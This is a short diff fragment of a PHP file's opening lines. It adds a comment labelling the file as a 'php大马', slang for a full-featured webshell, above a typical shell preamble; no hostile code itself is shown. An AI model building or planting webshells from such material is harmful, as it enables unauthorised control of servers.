@@ -1,5 +1,5 @@
 <?php
-
+//php大马
 error_reporting(7);
 @set_magic_quotes_runtime(0);
 ob_start();
